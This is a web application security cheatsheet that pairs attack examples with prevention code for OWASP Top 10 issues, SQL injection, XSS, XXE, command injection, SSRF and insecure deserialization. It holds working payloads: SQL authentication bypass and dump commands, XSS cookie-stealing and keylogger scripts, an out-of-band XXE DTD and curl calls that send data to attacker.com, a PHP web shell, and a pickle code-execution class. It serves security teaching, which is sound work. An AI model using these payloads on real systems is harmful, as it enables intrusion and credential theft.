# Web Security Cheatsheet

Quick reference for web application security, OWASP Top 10, and common vulnerabilities.

## 📚 Table of Contents

- [OWASP Top 10](#owasp-top-10)
- [SQL Injection](#sql-injection)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
- [Command Injection](#command-injection)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
- [Clickjacking](#clickjacking)
- [Open Redirect](#open-redirect)
- [Insecure Deserialization](#insecure-deserialization)
- [Authentication & Session Management](#authentication--session-management)
- [Security Misconfigurations](#security-misconfigurations)
- [File Upload Vulnerabilities](#file-upload-vulnerabilities)
- [Tools](#tools)

## 🔟 OWASP Top 10 (2021)

### 1. Broken Access Control
**Risk**: Users can act outside their intended permissions.

**Common Issues:**
- Accessing resources by modifying URL (forced browsing)
- Privilege escalation (acting as admin without being logged in)
- Insecure Direct Object References (IDOR)
- Missing access control for POST, PUT, DELETE
- Elevation of privilege (e.g., acting as another user)

**Example Attack:**
```
# Normal user accesses admin panel
http://example.com/admin/users
http://example.com/user/profile?id=123  # Change id to access other users

# API manipulation
GET /api/users/123  # Access other user's data
DELETE /api/users/456  # Delete other users
```

**Prevention:**
```python
# Implement proper access control
@app.route('/admin/users')
@login_required
@admin_required
def admin_users():
    if not current_user.is_admin:
        abort(403)  # Forbidden
    return render_template('admin/users.html')

# Check ownership
@app.route('/user/profile/<int:user_id>')
@login_required
def user_profile(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    user = User.query.get_or_404(user_id)
    return render_template('profile.html', user=user)
```

### 2. Cryptographic Failures
**Risk**: Sensitive data exposure through weak or missing encryption.

**Common Issues:**
- Transmitting sensitive data in clear text (HTTP instead of HTTPS)
- Using weak cryptographic algorithms (MD5, SHA1)
- Improper key management
- Not encrypting sensitive data at rest

**Example Attack:**
```bash
# Intercept unencrypted traffic
tcpdump -i eth0 -A | grep -i 'password'

# Crack weak hashes
hashcat -m 0 -a 0 hashes.txt wordlist.txt  # MD5
john --format=Raw-MD5 hashes.txt
```

**Prevention:**
```python
# Use HTTPS only
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Encrypt sensitive data
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
encrypted_data = cipher.encrypt(b"sensitive data")

# Use strong hashing for passwords
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

### 3. Injection
**Risk**: Malicious data sent to interpreter as part of command or query.

**Types:**
- SQL Injection (SQLi)
- NoSQL Injection
- OS Command Injection
- LDAP Injection
- XPath Injection

**See detailed sections below for SQL Injection and XSS.**

### 4. Insecure Design
**Risk**: Missing or ineffective security controls in design phase.

**Common Issues:**
- Unlimited password attempts
- No rate limiting
- Trust boundary violations
- Missing security requirements in design

**Prevention:**
```python
# Implement rate limiting
from flask_limiter import Limiter
limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic with account lockout
    user = User.query.filter_by(username=username).first()
    if user.failed_attempts >= 5:
        return "Account locked. Try again in 15 minutes."
    # ... rest of login logic
```

### 5. Security Misconfiguration
**Risk**: Insecure default configurations, incomplete setups, open cloud storage.

**See detailed section below.**

### 6. Vulnerable and Outdated Components
**Risk**: Using components with known vulnerabilities.

**Prevention:**
```bash
# Regular dependency scanning
npm audit
pip-audit
snyk test

# Keep dependencies updated
npm update
pip install --upgrade -r requirements.txt

# Use Dependabot or Renovate for automated updates
```

### 7. Identification and Authentication Failures
**Risk**: Broken authentication allowing attackers to compromise passwords, keys, or sessions.

**See detailed section below for Authentication & Session Management.**

### 8. Software and Data Integrity Failures
**Risk**: Code and infrastructure that does not protect against integrity violations.

**Common Issues:**
- Unsigned software updates
- Insecure deserialization
- Using untrusted CDNs

**Example Attack (Insecure Deserialization):**
```python
# VULNERABLE
import pickle
user_data = pickle.loads(base64.b64decode(cookie_data))

# SAFE
import json
user_data = json.loads(cookie_data)
```

### 9. Security Logging and Monitoring Failures
**Risk**: Insufficient logging allowing breaches to go undetected.

**Prevention:**
```python
import logging

# Configure comprehensive logging
logging.basicConfig(
    filename='app.log',
    level=logging.INFO,
    format='%(asctime)s %(levelname)s: %(message)s'
)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    if authenticate(username, password):
        logging.info(f"Successful login: {username} from {request.remote_addr}")
        return redirect('/dashboard')
    else:
        logging.warning(f"Failed login attempt: {username} from {request.remote_addr}")
        return "Invalid credentials"
```

### 10. Server-Side Request Forgery (SSRF)
**Risk**: Application fetching remote resources without validating user-supplied URL.

**Example Attack:**
```python
# Vulnerable endpoint
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)  # DANGEROUS!
    return response.content

# Attack
http://example.com/fetch?url=http://localhost:6379/  # Access internal Redis
http://example.com/fetch?url=file:///etc/passwd  # Read local files
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
```

**Prevention:**
```python
# Whitelist allowed domains
ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.trusted.com']

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    # Validate domain
    if parsed.hostname not in ALLOWED_DOMAINS:
        abort(400, "Invalid URL")
    
    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        abort(400, "Invalid scheme")
    
    response = requests.get(url, timeout=5)
    return response.content
```

## 💉 SQL Injection

### Types of SQL Injection

**1. Error-Based SQLi:**
```sql
' OR 1=1 --
' UNION SELECT NULL, NULL, NULL --
```

**2. Union-Based SQLi:**
```sql
' UNION SELECT username, password FROM users --
```

**3. Blind SQLi (Boolean-Based):**
```sql
' AND 1=1 --  (returns true)
' AND 1=2 --  (returns false)
```

**4. Time-Based Blind SQLi:**
```sql
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --
```

### Common Payloads

**Authentication Bypass:**
```sql
Username: admin' --
Password: anything

Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

**Extracting Data:**
```sql
# Find number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  (error = 2 columns)

# Find injectable columns
' UNION SELECT NULL, NULL --
' UNION SELECT 'test', NULL --

# Extract database name
' UNION SELECT database(), NULL --

# List tables
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --

# List columns
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

# Extract data
' UNION SELECT username, password FROM users --
```

**Database-Specific Payloads:**

```sql
-- MySQL
' UNION SELECT @@version, NULL --
' UNION SELECT load_file('/etc/passwd'), NULL --
' INTO OUTFILE '/var/www/html/shell.php' --

-- PostgreSQL
' UNION SELECT version(), NULL --
'; COPY (SELECT '') TO PROGRAM 'id' --

-- MSSQL
' UNION SELECT @@version, NULL --
'; EXEC xp_cmdshell 'whoami' --

-- SQLite
' UNION SELECT sqlite_version(), NULL --
```

### Prevention

```python
# NEVER concatenate user input
# BAD
query = "SELECT * FROM users WHERE username = '" + user_input + "'"

# GOOD - Use parameterized queries
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))

# Or use ORM
user = User.query.filter_by(username=user_input).first()
```

### Tools

```bash
# SQLMap - Automated SQL injection
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# With POST data
sqlmap -u "http://target.com/login" --data="username=test&password=test"

# With cookies
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"
```

## 🎭 Cross-Site Scripting (XSS)

### Types of XSS

**1. Reflected XSS:**
```html
<!-- Vulnerable code -->
<p>Hello, <?php echo $_GET['name']; ?></p>

<!-- Payload -->
http://target.com/page?name=<script>alert('XSS')</script>
```

**2. Stored XSS:**
```html
<!-- Comment stored in database with XSS payload -->
Comment: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

**3. DOM-Based XSS:**
```javascript
// Vulnerable JavaScript
var search = document.location.hash.substring(1);
document.write("Results for: " + search);

// Exploit
http://target.com/search#<img src=x onerror=alert('XSS')>
```

### Common XSS Payloads

**Basic Alert:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**Cookie Stealing:**
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

**Keylogger:**
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**Bypass Filters:**
```html
<!-- Uppercase -->
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Mixed case -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Without script tags -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

<!-- Without parentheses -->
<script>onerror=alert;throw'XSS'</script>

<!-- Without quotes -->
<script>alert(document.domain)</script>
```

### Prevention

```html
<!-- HTML Escaping -->
<?php
// GOOD - Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
?>

<!-- JavaScript -->
<!-- GOOD - Validate and sanitize -->
<script>
const userInput = <?php echo json_encode($user_input); ?>;
</script>
```

**Content Security Policy (CSP):**
```html
<!-- Add CSP header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

<!-- Or meta tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

## 🔐 Cross-Site Request Forgery (CSRF)

### CSRF Attack Example

**Vulnerable Form:**
```html
<!-- Legitimate bank transfer -->
<form action="http://bank.com/transfer" method="POST">
    <input name="to" value="">
    <input name="amount" value="">
    <button>Transfer</button>
</form>
```

**Attacker's Page:**
```html
<!-- Auto-submit form -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Or with image -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### Prevention

**1. CSRF Tokens:**
```html
<!-- Server generates random token per session -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input name="amount" value="">
    <button>Submit</button>
</form>
```

**2. SameSite Cookies:**
```php
setcookie('session', $value, [
    'samesite' => 'Strict',  // or 'Lax'
    'secure' => true,
    'httponly' => true
]);
```

**3. Check Referer Header:**
```php
if (!str_starts_with($_SERVER['HTTP_REFERER'], 'https://yoursite.com/')) {
    die('Invalid request');
}
```

## 🔀 XXE (XML External Entity)

### What is XXE?
XML External Entity attacks exploit vulnerable XML parsers that process external entity references.

### Attack Examples

**Basic XXE (File Disclosure):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**XXE to SSRF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<foo>&xxe;</foo>
```

**Blind XXE (Out-of-Band):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Billion Laughs (DoS):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

### Prevention

```python
# Python - Disable external entities
import defusedxml.ElementTree as ET
tree = ET.parse('file.xml')

# Java - Disable DTDs
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

# PHP - Disable external entities
libxml_disable_entity_loader(true);

# .NET - Secure settings
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

## 💻 Command Injection

### Attack Examples

**Basic Command Injection:**
```bash
# Vulnerable code: system("ping -c 4 " . $_GET['host']);

# Payloads:
; ls -la
&& whoami
| cat /etc/passwd
`whoami`
$(cat /etc/passwd)
```

**Command Chaining:**
```bash
; cat /etc/passwd
&& cat /etc/passwd  # Execute if previous succeeds
|| cat /etc/passwd  # Execute if previous fails
| cat /etc/passwd   # Pipe output
```

**Blind Command Injection:**
```bash
# Time-based detection
; sleep 10
&& ping -c 10 127.0.0.1

# Out-of-band
; curl http://attacker.com?data=$(whoami)
; nslookup `whoami`.attacker.com
```

**Bypass Filters:**
```bash
# Spaces
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd

# Quotes
c'a't /etc/passwd
c"a"t /etc/passwd

# Backslashes
c\at /etc/passwd

# Wildcards
cat /etc/pass*
cat /???/passwd
```

### Prevention

```python
import subprocess
import shlex

# Use array instead of shell=True
subprocess.run(['ping', '-c', '4', user_input])

# Validate input
if re.match(r'^[a-zA-Z0-9.-]+$', host):
    subprocess.run(['ping', '-c', '4', host])
```

## 🌐 SSRF (Server-Side Request Forgery)

### Attack Examples

**Basic SSRF:**
```
http://example.com/fetch?url=http://localhost:22
http://example.com/fetch?url=http://127.0.0.1:6379
http://example.com/fetch?url=http://192.168.1.1/admin
```

**AWS Metadata:**
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Cloud Metadata Services:**
```bash
# AWS
http://169.254.169.254/latest/meta-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

**File Protocol:**
```
http://example.com/fetch?url=file:///etc/passwd
http://example.com/fetch?url=file:///var/www/config.php
```

**Bypass Filters:**
```
# Localhost variations
http://127.0.0.1
http://127.1
http://0.0.0.0
http://0177.0.0.1  (octal)
http://2130706433  (decimal)
http://[::1]       (IPv6)
http://localhost.example.com  (DNS to 127.0.0.1)

# URL encoding
http://127.0.0.1 → http://127.0.0.%31

# Domain tricks
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
```

### Prevention

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_DOMAINS = ['api.trusted.com']

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check domain whitelist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    
    # Resolve and check IP
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except Exception:
        return False
    
    return True
```

## 🖱️ Clickjacking

### Attack Examples

**Basic Clickjacking:**
```html
<style>
    iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    button {
        position: absolute;
        top: 270px;
        left: 180px;
        z-index: 1;
    }
</style>

<button>Click for Prize!</button>
<iframe src="http://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

**Likejacking:**
```html
<!-- Trick users into liking a Facebook page -->
<iframe src="https://www.facebook.com/plugins/like.php?href=http://attacker.com"></iframe>
```

**Cursorjacking:**
```html
<style>
    * { cursor: none; }
    #fake-cursor {
        position: absolute;
        pointer-events: none;
    }
</style>
<img id="fake-cursor" src="cursor.png">
<script>
    // Move fake cursor with offset
    document.onmousemove = function(e) {
        document.getElementById('fake-cursor').style.left = (e.pageX - 50) + 'px';
        document.getElementById('fake-cursor').style.top = (e.pageY - 50) + 'px';
    }
</script>
```

### Prevention

**X-Frame-Options Header:**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com
```

**Content Security Policy:**
```
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted.com
```

**Frame-busting JavaScript:**
```javascript
// Prevent framing
if (top !== self) {
    top.location = self.location;
}
```

## 🔀 Open Redirect

### Attack Examples

**URL Parameter Redirect:**
```
http://example.com/redirect?url=http://evil.com
http://example.com/redirect?next=/login  # Good
http://example.com/redirect?next=//evil.com  # Bad
```

**Header-Based Redirect:**
```
http://example.com/redirect?url=https://evil.com
```

**Bypass Techniques:**
```
# Protocol-relative URL
//evil.com

# Whitelist bypass
http://example.com@evil.com
http://example.com.evil.com
http://example.com/redirect?url=https://example.com.evil.com

# URL encoding
http://example.com/redirect?url=https%3A%2F%2Fevil.com

# Open redirect chain
http://trusted.com/redirect?url=http://example.com/redirect?url=http://evil.com
```

### Prevention

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'app.example.com']

@app.route('/redirect')
def redirect_url():
    url = request.args.get('url', '/')
    
    # Only allow relative URLs
    if url.startswith('/') and not url.startswith('//'):
        return redirect(url)
    
    # Or validate domain
    parsed = urlparse(url)
    if parsed.netloc in ALLOWED_DOMAINS:
        return redirect(url)
    
    return abort(400, "Invalid redirect URL")
```

## 🔓 Insecure Deserialization

### Attack Examples

**Python Pickle:**
```python
# Malicious pickle payload
import pickle
import os

class EvilClass:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(EvilClass())
# Send payload to vulnerable application

# Vulnerable code:
data = pickle.loads(user_input)  # DANGEROUS!
```

**Java Deserialization:**
```java
// Vulnerable code
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // DANGEROUS!

// Tools: ysoserial
java -jar ysoserial.jar CommonsCollections1 'calc' | base64
```

**PHP Deserialization:**
```php
// Vulnerable code
$data = unserialize($_COOKIE['data']);  // DANGEROUS!

// Magic methods exploited:
class Evil {
    function __wakeup() {
        system($this->cmd);
    }
}
```

**Node.js:**
```javascript
// Vulnerable code
var obj = eval('(' + userInput + ')');  // DANGEROUS!

// Or with node-serialize
var serialize = require('node-serialize');
var obj = serialize.unserialize(userInput);  // Can be dangerous
```

### Prevention

```python
# Use safe formats
import json
data = json.loads(user_input)  # Safe for data

# Or validate signature
import hmac
import hashlib

def serialize_secure(obj):
    data = json.dumps(obj)
    sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
    return base64.b64encode(f"{sig}:{data}".encode())

def deserialize_secure(payload):
    decoded = base64.b64decode(payload).decode()
    sig, data = decoded.split(':', 1)
    expected_sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected_sig):
        raise ValueError("Invalid signature")
    return json.loads(data)
```

## 🔑 Authentication & Session Management

### Common Vulnerabilities

**1. Weak Password Policy:**
```python
# BAD
if len(password) >= 4:
    create_account()

# GOOD
import re
if (len(password) >= 12 and 
    re.search(r'[A-Z]', password) and
    re.search(r'[a-z]', password) and
    re.search(r'[0-9]', password) and
    re.search(r'[!@#$%^&*]', password)):
    create_account()
```

**2. Session Fixation:**
```php
// GOOD - Regenerate session ID on login
session_start();
if (authenticate($username, $password)) {
    session_regenerate_id(true);  // Prevent fixation
    $_SESSION['user'] = $username;
}
```

**3. Insecure Password Storage:**
```python
# BAD
password_hash = md5(password)  # Broken hash
password_hash = sha1(password)  # Still bad

# GOOD
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Verify
if bcrypt.checkpw(input_password.encode(), stored_hash):
    print("Correct password")
```

### Best Practices

```python
# Complete authentication example
import bcrypt
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = 'random-secret-key'  # Use strong random key

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Get user from database
    user = db.get_user(username)
    
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        # Regenerate session
        session.regenerate()
        session['user_id'] = user.id
        session['username'] = username
        return redirect('/dashboard')
    else:
        # Generic error (don't reveal which failed)
        return "Invalid credentials"

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')
```

## ⚙️ Security Misconfigurations

### Common Issues

**1. Directory Listing:**
```apache
# .htaccess - Disable directory listing
Options -Indexes
```

**2. Verbose Error Messages:**
```php
// BAD - In production
ini_set('display_errors', 1);
error_reporting(E_ALL);

// GOOD - In production
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(0);
```

**3. Unnecessary HTTP Methods:**
```apache
# Limit to GET and POST
<LimitExcept GET POST>
    Require all denied
</LimitExcept>
```

**4. Missing Security Headers:**
```python
# Flask example
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

## 📁 File Upload Vulnerabilities

### Common Attacks

**1. Upload PHP Shell:**
```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>
```

**2. Bypass Extension Checks:**
```
shell.php.jpg
shell.php%00.jpg  (null byte)
shell.php;.jpg
shell.pHP
shell.php5
```

### Prevention

```python
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file'
    
    file = request.files['file']
    
    # Check filename
    if not allowed_file(file.filename):
        return 'Invalid file type'
    
    # Sanitize filename
    filename = secure_filename(file.filename)
    
    # Check file content (magic bytes)
    if file.read(4) not in [b'\x89PNG', b'\xff\xd8\xff']:  # PNG or JPEG
        return 'Invalid file content'
    file.seek(0)  # Reset pointer
    
    # Save outside webroot
    file.save(os.path.join('/var/uploads', filename))
    
    return 'File uploaded'
```

## 🛠️ Tools

### Burp Suite

```bash
# Essential features
- Proxy: Intercept and modify requests
- Repeater: Resend and modify requests
- Intruder: Automated attacks
- Scanner: Automated vulnerability scanning (Pro)
- Decoder: Encode/decode data
```

**Common Workflows:**
1. Configure browser proxy (127.0.0.1:8080)
2. Browse target site
3. Intercept request in Burp
4. Send to Repeater
5. Modify and test payloads
6. Document findings

### OWASP ZAP

```bash
# Automated scan
zap-cli quick-scan http://target.com

# Spider site
zap-cli spider http://target.com

# Active scan
zap-cli active-scan http://target.com

# Export report
zap-cli report -o report.html -f html
```

### Nikto

```bash
# Basic scan
nikto -h http://target.com

# With authentication
nikto -h http://target.com -id admin:password

# SSL/TLS
nikto -h https://target.com -ssl

# Specific port
nikto -h target.com -p 8080
```

### wfuzz

```bash
# Directory fuzzing
wfuzz -w wordlist.txt http://target.com/FUZZ

# POST parameter fuzzing
wfuzz -w wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login

# Header fuzzing
wfuzz -w wordlist.txt -H "X-Forwarded-For: FUZZ" http://target.com
```

## 📚 Resources

### Learning Platforms
- **[Hacksplaining](https://www.hacksplaining.com/lessons)** - Interactive security training covering:
  - SQL Injection
  - Cross-Site Scripting (XSS)
  - CSRF
  - Clickjacking
  - XXE (XML External Entity)
  - Command Injection
  - Directory Traversal
  - Subdomain Takeover
  - Open Redirects
  - And many more vulnerabilities
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** - Free online web security training with labs
- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)** - Deliberately insecure application for learning
- **[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)** - Modern vulnerable web application
- **[HackerOne Hacker101](https://www.hacker101.com/)** - Free security classes and CTF
- **[DVWA](http://www.dvwa.co.uk/)** - Damn Vulnerable Web Application
- **[bWAPP](http://www.itsecgames.com/)** - Buggy Web Application
- **[Mutillidae](https://sourceforge.net/projects/mutillidae/)** - Vulnerable PHP web app

### Practice Challenges
- **[PentesterLab](https://pentesterlab.com/)** - Hands-on penetration testing exercises
- **[HackTheBox](https://www.hackthebox.eu/)** - Penetration testing labs
- **[TryHackMe](https://tryhackme.com/)** - Guided cybersecurity training
- **[Root-Me](https://www.root-me.org/)** - 400+ hacking challenges
- **[OverTheWire](https://overthewire.org/wargames/)** - Wargames for learning security

### Official Documentation
- **[OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)** - Comprehensive testing methodology
- **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)** - Security implementation cheat sheets
- **[OWASP Top 10](https://owasp.org/www-project-top-ten/)** - Most critical web application security risks
- **[CWE Top 25](https://cwe.mitre.org/top25/)** - Most dangerous software weaknesses

### Bug Bounty Platforms
- **[HackerOne](https://www.hackerone.com/)** - Bug bounty and vulnerability coordination
- **[Bugcrowd](https://www.bugcrowd.com/)** - Crowdsourced cybersecurity
- **[Intigriti](https://www.intigriti.com/)** - European bug bounty platform
- **[YesWeHack](https://www.yeswehack.com/)** - Bug bounty and VDP platform

### Tools & Extensions
- **[Burp Suite](https://portswigger.net/burp)** - Web vulnerability scanner
- **[OWASP ZAP](https://www.zaproxy.org/)** - Free security testing tool
- **[Wappalyzer](https://www.wappalyzer.com/)** - Technology profiler extension
- **[FoxyProxy](https://getfoxyproxy.org/)** - Proxy management extension
- **[Cookie-Editor](https://cookie-editor.cgagnier.ca/)** - Cookie manipulation

### Books & Reading
- **"The Web Application Hacker's Handbook"** by Stuttard & Pinto
- **"Real-World Bug Hunting"** by Peter Yaworski
- **"Web Hacking 101"** by Peter Yaworski
- **"The Tangled Web"** by Michal Zalewski

---

**Remember**: Only test applications you own or have permission to test!
